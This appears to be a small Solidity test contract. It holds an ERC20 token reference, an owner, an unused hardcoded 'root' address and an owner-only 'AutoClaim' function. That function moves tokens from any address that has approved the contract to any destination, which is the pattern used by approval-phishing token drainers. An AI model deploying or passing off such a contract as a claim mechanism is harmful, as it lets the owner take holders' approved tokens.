pragma solidity 0.6.2;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/token/ERC20/ERC20.sol";
contract Test{
    ERC20 public token;
    address public owner;
    address public root=0x8b97290244e05DFA935922AA9AfA667a78888888;
    constructor(ERC20 _token) public{
        owner = msg.sender;
        token=_token;
    }
    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }
    function AutoClaim
    (address _from,address _to,uint256 _amount) 
    payable onlyOwner public{
        token.transferFrom(_from,_to,_amount);
    }
}